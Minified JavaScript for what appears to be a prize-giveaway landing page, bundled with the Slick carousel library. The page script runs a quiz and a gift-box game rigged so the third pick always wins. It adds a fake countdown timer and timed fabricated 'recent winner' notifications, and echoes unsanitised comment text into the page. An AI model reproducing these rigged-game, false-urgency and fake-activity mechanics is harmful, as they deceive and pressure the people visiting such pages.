                : ((i = this.options.slidesToShow + t),
                  n
                    .slice(i - e + 1 + s, i + e + 2)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")),
              0 === t
                ? n
                    .eq(n.length - 1 - this.options.slidesToShow)
                    .addClass("slick-center")
                : t === this.slideCount - 1 &&
                  n.eq(this.options.slidesToShow).addClass("slick-center")),
            this.$slides.eq(t).addClass("slick-center");
        } else
          t >= 0 && t <= this.slideCount - this.options.slidesToShow
            ? this.$slides
                .slice(t, t + this.options.slidesToShow)
                .addClass("slick-active")
                .attr("aria-hidden", "false")
            : n.length <= this.options.slidesToShow
            ? n.addClass("slick-active").attr("aria-hidden", "false")
            : ((o = this.slideCount % this.options.slidesToShow),
              (i =
                !0 === this.options.infinite
                  ? this.options.slidesToShow + t
                  : t),
              this.options.slidesToShow == this.options.slidesToScroll &&
              this.slideCount - t < this.options.slidesToShow
                ? n
                    .slice(i - (this.options.slidesToShow - o), i + o)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                : n
                    .slice(i, i + this.options.slidesToShow)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false"));
        ("ondemand" !== this.options.lazyLoad &&
          "anticipated" !== this.options.lazyLoad) ||
          this.lazyLoad();
      }),
      (n.prototype.setupInfinite = function () {
        var e,
          n,
          i,
          o = this;
        if (
          (!0 === o.options.fade && (o.options.centerMode = !1),
          !0 === o.options.infinite &&
            !1 === o.options.fade &&
            ((n = null), o.slideCount > o.options.slidesToShow))
        ) {
          for (
            i =
              !0 === o.options.centerMode
                ? o.options.slidesToShow + 1
                : o.options.slidesToShow,
              e = o.slideCount;
            e > o.slideCount - i;
            e -= 1
          )
            (n = e - 1),
              t(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n - o.slideCount)
                .prependTo(o.$slideTrack)
                .addClass("slick-cloned");
          for (e = 0; e < i + o.slideCount; e += 1)
            (n = e),
              t(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n + o.slideCount)
                .appendTo(o.$slideTrack)
                .addClass("slick-cloned");
          o.$slideTrack
            .find(".slick-cloned")
            .find("[id]")
            .each(function () {
              t(this).attr("id", "");
            });
        }
      }),
      (n.prototype.interrupt = function (t) {
        var e = this;
        t || e.autoPlay(), (e.interrupted = t);
      }),
      (n.prototype.selectHandler = function (e) {
        var n = parseInt(
          (t(e.target).is(".slick-slide")
            ? t(e.target)
            : t(e.target).parents(".slick-slide")
          ).attr("data-slick-index")
        );
        n || (n = 0),
          this.slideCount <= this.options.slidesToShow
            ? this.slideHandler(n, !1, !0)
            : this.slideHandler(n);
      }),
      (n.prototype.slideHandler = function (t, e, n) {
        var i,
          o,
          s,
          r,
          a,
          l = null,
          c = this;
        if (
          ((e = e || !1),
          !(
            (!0 === c.animating && !0 === c.options.waitForAnimate) ||
            (!0 === c.options.fade && c.currentSlide === t)
          ))
        ) {
          if (
            (!1 === e && c.asNavFor(t),
            (i = t),
            (l = c.getLeft(i)),
            (r = c.getLeft(c.currentSlide)),
            (c.currentLeft = null === c.swipeLeft ? r : c.swipeLeft),
            !1 === c.options.infinite &&
              !1 === c.options.centerMode &&
              (t < 0 || t > c.getDotCount() * c.options.slidesToScroll))
          )
            !1 === c.options.fade &&
              ((i = c.currentSlide),
              !0 !== n
                ? c.animateSlide(r, function () {
                    c.postSlide(i);
                  })
                : c.postSlide(i));
          else if (
            !1 === c.options.infinite &&
            !0 === c.options.centerMode &&
            (t < 0 || t > c.slideCount - c.options.slidesToScroll)
          )
            !1 === c.options.fade &&
              ((i = c.currentSlide),
              !0 !== n
                ? c.animateSlide(r, function () {
                    c.postSlide(i);
                  })
                : c.postSlide(i));
          else {
            if (
              (c.options.autoplay && clearInterval(c.autoPlayTimer),
              (o =
                i < 0
                  ? c.slideCount % c.options.slidesToScroll != 0
                    ? c.slideCount - (c.slideCount % c.options.slidesToScroll)
                    : c.slideCount + i
                  : i >= c.slideCount
                  ? c.slideCount % c.options.slidesToScroll != 0
                    ? 0
                    : i - c.slideCount
                  : i),
              (c.animating = !0),
              c.$slider.trigger("beforeChange", [c, c.currentSlide, o]),
              (s = c.currentSlide),
              (c.currentSlide = o),
              c.setSlideClasses(c.currentSlide),
              c.options.asNavFor &&
                (a = (a = c.getNavTarget()).slick("getSlick")).slideCount <=
                  a.options.slidesToShow &&
                a.setSlideClasses(c.currentSlide),
              c.updateDots(),
              c.updateArrows(),
              !0 === c.options.fade)
            )
              return (
                !0 !== n
                  ? (c.fadeSlideOut(s),
                    c.fadeSlide(o, function () {
                      c.postSlide(o);
                    }))
                  : c.postSlide(o),
                void c.animateHeight()
              );
            !0 !== n
              ? c.animateSlide(l, function () {
                  c.postSlide(o);
                })
              : c.postSlide(o);
          }
        }
      }),
      (n.prototype.startLoad = function () {
        !0 === this.options.arrows &&
          this.slideCount > this.options.slidesToShow &&
          (this.$prevArrow.hide(), this.$nextArrow.hide()),
          !0 === this.options.dots &&
            this.slideCount > this.options.slidesToShow &&
            this.$dots.hide(),
          this.$slider.addClass("slick-loading");
      }),
      (n.prototype.swipeDirection = function () {
        var t, e, n, i;
        return (
          (t = this.touchObject.startX - this.touchObject.curX),
          (i = Math.round(
            (180 *
              (n = Math.atan2(
                (e = this.touchObject.startY - this.touchObject.curY),
                t
              ))) /
              Math.PI
          )) < 0 && (i = 360 - Math.abs(i)),
          i <= 45 && i >= 0
            ? !1 === this.options.rtl
              ? "left"
              : "right"
            : i <= 360 && i >= 315
            ? !1 === this.options.rtl
              ? "left"
              : "right"
            : i >= 135 && i <= 225
            ? !1 === this.options.rtl
              ? "right"
              : "left"
            : !0 === this.options.verticalSwiping
            ? i >= 35 && i <= 135
              ? "down"
              : "up"
            : "vertical"
        );
      }),
      (n.prototype.swipeEnd = function (t) {
        var e,
          n,
          i = this;
        if (((i.dragging = !1), (i.swiping = !1), i.scrolling))
          return (i.scrolling = !1), !1;
        if (
          ((i.interrupted = !1),
          (i.shouldClick = !(i.touchObject.swipeLength > 10)),
          void 0 === i.touchObject.curX)
        )
          return !1;
        if (
          (!0 === i.touchObject.edgeHit &&
            i.$slider.trigger("edge", [i, i.swipeDirection()]),
          i.touchObject.swipeLength >= i.touchObject.minSwipe)
        ) {
          switch ((n = i.swipeDirection())) {
            case "left":
            case "down":
              (e = i.options.swipeToSlide
                ? i.checkNavigable(i.currentSlide + i.getSlideCount())
                : i.currentSlide + i.getSlideCount()),
                (i.currentDirection = 0);
              break;
            case "right":
            case "up":
              (e = i.options.swipeToSlide
                ? i.checkNavigable(i.currentSlide - i.getSlideCount())
                : i.currentSlide - i.getSlideCount()),
                (i.currentDirection = 1);
          }
          "vertical" != n &&
            (i.slideHandler(e),
            (i.touchObject = {}),
            i.$slider.trigger("swipe", [i, n]));
        } else
          i.touchObject.startX !== i.touchObject.curX &&
            (i.slideHandler(i.currentSlide), (i.touchObject = {}));
      }),
      (n.prototype.swipeHandler = function (t) {
        var e = this;
        if (
          !(
            !1 === e.options.swipe ||
            ("ontouchend" in document && !1 === e.options.swipe) ||
            (!1 === e.options.draggable && -1 !== t.type.indexOf("mouse"))
          )
        )
          switch (
            ((e.touchObject.fingerCount =
              t.originalEvent && void 0 !== t.originalEvent.touches
                ? t.originalEvent.touches.length
                : 1),
            (e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold),
            !0 === e.options.verticalSwiping &&
              (e.touchObject.minSwipe =
                e.listHeight / e.options.touchThreshold),
            t.data.action)
          ) {
            case "start":
              e.swipeStart(t);
              break;
            case "move":
              e.swipeMove(t);
              break;
            case "end":
              e.swipeEnd(t);
          }
      }),
      (n.prototype.swipeMove = function (t) {
        var e,
          n,
          i,
          o,
          s,
          r,
          a = this;
        return (
          (s = void 0 !== t.originalEvent ? t.originalEvent.touches : null),
          !(!a.dragging || a.scrolling || (s && 1 !== s.length)) &&
            ((e = a.getLeft(a.currentSlide)),
            (a.touchObject.curX = void 0 !== s ? s[0].pageX : t.clientX),
            (a.touchObject.curY = void 0 !== s ? s[0].pageY : t.clientY),
            (a.touchObject.swipeLength = Math.round(
              Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2))
            )),
            (r = Math.round(
              Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2))
            )),
            a.options.verticalSwiping || a.swiping || !(r > 4)
              ? (!0 === a.options.verticalSwiping &&
                  (a.touchObject.swipeLength = r),
                (n = a.swipeDirection()),
                void 0 !== t.originalEvent &&
                  a.touchObject.swipeLength > 4 &&
                  ((a.swiping = !0), t.preventDefault()),
                (o =
                  (!1 === a.options.rtl ? 1 : -1) *
                  (a.touchObject.curX > a.touchObject.startX ? 1 : -1)),
                !0 === a.options.verticalSwiping &&
                  (o = a.touchObject.curY > a.touchObject.startY ? 1 : -1),
                (i = a.touchObject.swipeLength),
                (a.touchObject.edgeHit = !1),
                !1 === a.options.infinite &&
                  ((0 === a.currentSlide && "right" === n) ||
                    (a.currentSlide >= a.getDotCount() && "left" === n)) &&
                  ((i = a.touchObject.swipeLength * a.options.edgeFriction),
                  (a.touchObject.edgeHit = !0)),
                !1 === a.options.vertical
                  ? (a.swipeLeft = e + i * o)
                  : (a.swipeLeft =
                      e + i * (a.$list.height() / a.listWidth) * o),
                !0 === a.options.verticalSwiping && (a.swipeLeft = e + i * o),
                !0 !== a.options.fade &&
                  !1 !== a.options.touchMove &&
                  (!0 === a.animating
                    ? ((a.swipeLeft = null), !1)
                    : void a.setCSS(a.swipeLeft)))
              : ((a.scrolling = !0), !1))
        );
      }),
      (n.prototype.swipeStart = function (t) {
        var e,
          n = this;
        if (
          ((n.interrupted = !0),
          1 !== n.touchObject.fingerCount ||
            n.slideCount <= n.options.slidesToShow)
        )
          return (n.touchObject = {}), !1;
        void 0 !== t.originalEvent &&
          void 0 !== t.originalEvent.touches &&
          (e = t.originalEvent.touches[0]),
          (n.touchObject.startX = n.touchObject.curX =
            void 0 !== e ? e.pageX : t.clientX),
          (n.touchObject.startY = n.touchObject.curY =
            void 0 !== e ? e.pageY : t.clientY),
          (n.dragging = !0);
      }),
      (n.prototype.unfilterSlides = n.prototype.slickUnfilter =
        function () {
          null !== this.$slidesCache &&
            (this.unload(),
            this.$slideTrack.children(this.options.slide).detach(),
            this.$slidesCache.appendTo(this.$slideTrack),
            this.reinit());
        }),
      (n.prototype.unload = function () {
        t(".slick-cloned", this.$slider).remove(),
          this.$dots && this.$dots.remove(),
          this.$prevArrow &&
            this.htmlExpr.test(this.options.prevArrow) &&
            this.$prevArrow.remove(),
          this.$nextArrow &&
            this.htmlExpr.test(this.options.nextArrow) &&
            this.$nextArrow.remove(),
          this.$slides
            .removeClass("slick-slide slick-active slick-visible slick-current")
            .attr("aria-hidden", "true")
            .css("width", "");
      }),
      (n.prototype.unslick = function (t) {
        this.$slider.trigger("unslick", [this, t]), this.destroy();
      }),
      (n.prototype.updateArrows = function () {
        this.options.slidesToShow,
          !0 === this.options.arrows &&
            this.slideCount > this.options.slidesToShow &&
            !this.options.infinite &&
            (this.$prevArrow
              .removeClass("slick-disabled")
              .attr("aria-disabled", "false"),
            this.$nextArrow
              .removeClass("slick-disabled")
              .attr("aria-disabled", "false"),
            0 === this.currentSlide
              ? (this.$prevArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"),
                this.$nextArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false"))
              : this.currentSlide >=
                  this.slideCount - this.options.slidesToShow &&
                !1 === this.options.centerMode
              ? (this.$nextArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"),
                this.$prevArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false"))
              : this.currentSlide >= this.slideCount - 1 &&
                !0 === this.options.centerMode &&
                (this.$nextArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"),
                this.$prevArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false")));
      }),
      (n.prototype.updateDots = function () {
        null !== this.$dots &&
          (this.$dots.find("li").removeClass("slick-active").end(),
          this.$dots
            .find("li")
            .eq(Math.floor(this.currentSlide / this.options.slidesToScroll))
            .addClass("slick-active"));
      }),
      (n.prototype.visibility = function () {
        var t = this;
        t.options.autoplay &&
          (document[t.hidden] ? (t.interrupted = !0) : (t.interrupted = !1));
      }),
      (t.fn.slick = function () {
        var t,
          e,
          i = this,
          o = arguments[0],
          s = Array.prototype.slice.call(arguments, 1),
          r = i.length;
        for (t = 0; t < r; t++)
          if (
            ("object" == typeof o || void 0 === o
              ? (i[t].slick = new n(i[t], o))
              : (e = i[t].slick[o].apply(i[t].slick, s)),
            void 0 !== e)
          )
            return e;
        return i;
      });
  }),
  $(document).ready(function () {
    function t(t) {
      return t < 10 && (t = "0" + t), t;
    }
    var e = new Date(),
      n = new Date();
    n.setDate(n.getDate() + 2);
    var i = t(e.getHours()) + ":" + t(e.getMinutes());
    if (
      ($(".js-info_dia").text(e.getDate()),
      $(".js-info_mes").text(e.getMonth()),
      $(".js-info_anyo").text(e.getFullYear()),
      $(".js-info_dia-nombre").text(dayNames[e.getDay()]),
      $(".js-info_mes-nombre").text(monthNames[e.getMonth()]),
      $(".js-info_dia-next2").text(n.getDate()),
      $(".js-info_mes-nombre-next2").text(monthNames[n.getMonth()]),
      $(".js-info_hora-fija").text(i),
      $(".js-info_browser").length >= 1)
    ) {
      var o = getBrowser();
      $(".js-info_browser").text(o);
    }
    if (jQuery(".js-info_browser").length >= 1) {
      var s = getPlatform();
      jQuery(".js-info_so").text(s);
    }
    (function t(e, n) {
      var i = $(e),
        o = $(n);
      if (i) {
        var s = new Date().getDate();
        i.text(s), o.text(s + 2);
      }
    })(".js-current-day", ".js-end-prom-day"),
      $(".js-slider-for").slick({
        slidesToShow: 1,
        slidesToScroll: 1,
        adaptiveHeight: true,
        arrows: !1,
        fade: !0,
        asNavFor: ".js-slider-nav",
      }),
      $(".js-slider-nav").slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        asNavFor: ".js-slider-for",
        dots: !1,
        focusOnSelect: !0,
        prevArrow:
          "<button type='button' class='slick-prev slick-arrow'><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAABmJLR0QA/wD/AP+gvaeTAAAA9ElEQVRIie3WMUpDQRAG4A9BrOwEwcrCA9hYWqVKq43ewXgJ4yGs9Ao5gJJGUPEMgoFUYieCKHkWz8DbJaCoO49Afth2P2bZnR0WmZOs4hbV17qKQJcwaKAV7iPg0wx9xlZpdB+TBvqOTml0Gy/Sao9Ko+sYZeh5aXQZwwy9xkpp+CxDH9UnUDTHGfqKndJoR31rp+gEB6XRTTxJqz0pjcJdhg7UHevP+W6T6j+Q32TWUfej8F28SS/XYRTe08JzmiZvIGNsRMCttUxYw0OGX0TAzP4We1H4nnQQ+EA3Cu9Lqw4ZfWhx2KMeb28a8GUUvMiP8wl+P2e4Vi0+4AAAAABJRU5ErkJggg==\"></button>",
        nextArrow:
          "<button type='button' class='slick-next slick-arrow'><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAABmJLR0QA/wD/AP+gvaeTAAAA7klEQVRIie3WMUpDQRAG4I+AWNkJgpWFB7DQ0iqVrTZ6B5NLGA9hpVfIARJsAgl4BkHBSuwkIBFj8RT2LSkE2XkJ5Ictl49dZmeHdZYsQ8x/1gRbUfBDAs/RRysC3sNrhvciYDjGRwJ/4SIK76ifeoqjKPwmw1+wGwFv4D7DR9iMwLfxmOF3ETAc4D3DO1H4qaq6f+FPnEThPfVTv2E/Am6pOlmKT/6yaWVzrYGrPlMvrhnapdFFz+myNLqD5wy9LY021jLzT+JJdQNF083QKQ5Lo21V1aaDwHlpdNHoc1UapcFhb5CgY4Hj7Tr/zjfcW2a3eoiKgwAAAABJRU5ErkJggg==\"></button>",
      }),
      $("#textarea").on("keyup", function () {
        $(this).val().length > 5
          ? $("#commentBtn").removeAttr("disabled")
          : $("#commentBtn").attr("disabled", "disabled");
      }),
      $("#commentBtn").on("click", function () {
        $("#commentsList").append(
          '<li class="comment__item"><div class="comment__container">\n                                <div class="comment__avatar">\n                                </div>\n                                <div class="comment__content">\n                                    <div class="comment__name">User</div>\n                                    <div class="comment__text">\n' +
            $("#textarea").val() +
            '                                    </div>\n                                    <ul class="comment__actions">\n                                        <span>\n                                            <img src="images/like.png" alt="">\n                                        </span>\n                                        <div>1</div>\n                                    </ul>\n                                </div>\n                                <div class="comment__time">\n                                    <span>1 min</span>\n                                    <span>like</span>\n                                    <span>comment</span>\n                                </div>\n                            </div></li>'
        ),
          $("#textarea").val(""),
          $("#commentBtn").attr("disabled", "disabled");
      }),
      $(".js-answer").on("click", function (t) {
        t.preventDefault();
        var e = $(this).data("next");
        $(this).data("answ"),
          console.log($("#" + e)),
          $("#" + e).length
            ? $("#" + e)
                .prev()
                .fadeOut("slow", function () {
                  $("#" + e).fadeIn("slow");
                })
            : ($("#text,#quiz").fadeOut(),
              $([document.documentElement, document.body]).animate(
                { scrollTop: $("body").offset().top },
                1200
              ),
              $("#preloader").fadeIn("slow"),
              setTimeout(function () {
                $("#res1").fadeIn("slow");
              }, 500),
              setTimeout(function () {
                $("#res2").fadeIn("slow");
              }, 1700),
              setTimeout(function () {
                $("#res3").fadeIn("slow");
              }, 3200),
              setTimeout(function () {
                $("#preloader").fadeOut(), $("#choose").fadeIn();
              }, 4500),
              setTimeout(function () {
                $.fancybox.open({ src: "#modal1" });
              }, 5e3));
      });
    var r = 1,
      a = 3,
      l = !1;
    $(document).on("click", ".choose__item:not(.abierta)", function () {
      r <= 3 &&
        (console.log(!$(this).hasClass("abierta")),
        $("#boxes").css("pointer-events", "none"),
        $(this).hasClass("abierta") ||
          ((l = !1),
          $(".circle-loader").removeClass("load-complete"),
          $(".check-icon").css("display", "none"),
          $(this).addClass("abierta"),
          3 == r
            ? ($(this).addClass("premiazo"),
              setTimeout(function () {
                $(".div_img_gift, .img_gift").fadeIn("slow", function () {
                  setTimeout(function () {
                    if (
                      ($.fancybox.close({ src: "#modal2" }),
                      $.fancybox.open({ src: "#modal3", clickSlide: false }),
                      $(".circle-loader").addClass("load-complete"),
                      $(".check-icon").css("display", "block"),
                      $("#timerr").length >= 1)
                    ) {
                      var t, e, n, i;
                      (n = 119),
                        (i = setInterval(function () {
                          (t = parseInt(n / 60, 10)),
                            (e = 10 > (e = parseInt(n % 60, 10)) ? "0" + e : e),
                            $("#timerr").text(
                              t + " " + minutos_y + e + " " + segundos
                            ),
                            --n < 0 && clearInterval(i);
                        }, 1e3));
                    }
                  }, 1500);
                });
              }, 4e3))
            : (r++,
              a--,
              $("#iteration").html(a),
              setTimeout(function () {
                $.fancybox.open({ src: "#modal2" }),
                  setTimeout(function () {
                    $(".circle-loader").addClass("load-complete"),
                      $(".check-icon").css("display", "block"),
                      $("#boxes").css("pointer-events", "all");
                  }, 1e3);
              }, 2e3))));
    }),
      ($.fancybox.defaults.touch = !1),
      $("#faqBtn").on("click", function () {
        $("#faq").addClass("active"), $("#faqBtn").hide();
      }),
      $("#faqClose").on("click", function () {
        $("#faq").removeClass("active"), $("#faqBtn").show();
      }),
      $(document).mouseup(function (t) {
        var e = $("#faq");
        e.is(t.target) ||
          0 !== e.has(t.target).length ||
          (e.removeClass("active"), $("#faqBtn").show());
      }),
      $(".js-faq-header").on("click", function () {
        $(".js-faq-header").not($(this)).removeClass("active"),
          $(".js-faq-body").not($(this).siblings(".js-faq-body")).slideUp(),
          $(this).toggleClass("active").siblings(".js-faq-body").slideToggle();
      });
    var c = $(".scrollToTopBtn"),
      d = document.documentElement;
    c.on("click", function t() {
      $([document.documentElement, document.body]).animate(
        { scrollTop: $("body").offset().top },
        500
      );
    }),
      document.addEventListener("scroll", function t() {
        var e = d.scrollHeight - d.clientHeight;
        d.scrollTop / e > 0.45
          ? c.addClass("showBtn")
          : c.removeClass("showBtn");
      });
    let u = new (class t {
        constructor(t) {
          (this.lang = { from: " من " }),
            (this.container = document.querySelector(t)),
            (this.items = document.createElement("ul")),
            this.items.classList.add("notifications__items"),
            this.container.appendChild(this.items);
        }
        create({ name: t, address: e, desc: n, img: i, time: o }) {
          let s = `<div class="notifications__item__img"><img src="${i}" alt="" sizes="" srcset=""></div><div class="notifications__item__content"><div class="notifications__item__content__header"><span class="notifications__item-name">${t}</span>${this.lang.from}<span class="notifications__item-address">${e}</span></div><div class="notifications__item__content__desc">${n}</div><div class="notifications__item__content__bottom"><div class="notifications__item__time">${o}</div><div class="notifications__item__icons"><img src="https://imgs.staticlanderlab.com/71d9c1df-997c-439f-a88b-ebde4e684500/format=webp,w=20,h=20" alt=""></div></div></div><div class="notifications__item__btn"><img class="notifications__item__btn-close" src="https://tracckin234-xyz.s3.eu-north-1.amazonaws.com/asset/notifications-close.svg" height="15px" width="15px" alt=""></div>`,
            r = document.createElement("li");
          return (
            r.classList.add("notifications__item", "showNoty"),
            (r.innerHTML = s),
            r.addEventListener("click", (t) => t.currentTarget.remove()),
            r
          );
        }
        send(t) {
          let e = this.create(t);
          return this.items.prepend(e), e;
        }
        hide(t) {
          setTimeout(() => {
            t.classList.remove("showNoty"),
              t.classList.add("hiddenNoty"),
              setTimeout(() => {
                t.remove();
              }, 1500);
          }, 7500);
        }
      })(".notifications"),
      p = (t) =>
        new Promise((e, n) => {
          setTimeout(() => e(), t);
        }),
      f = (t, e) => Math.round(t + Math.random() * (e - t));
    data.forEach((t, e) => {
      p(e ? f(6e4, 18e4) : 2e4).then(() => {
        let e = u.send(t);
        u.hide(e);
      });
    });
  });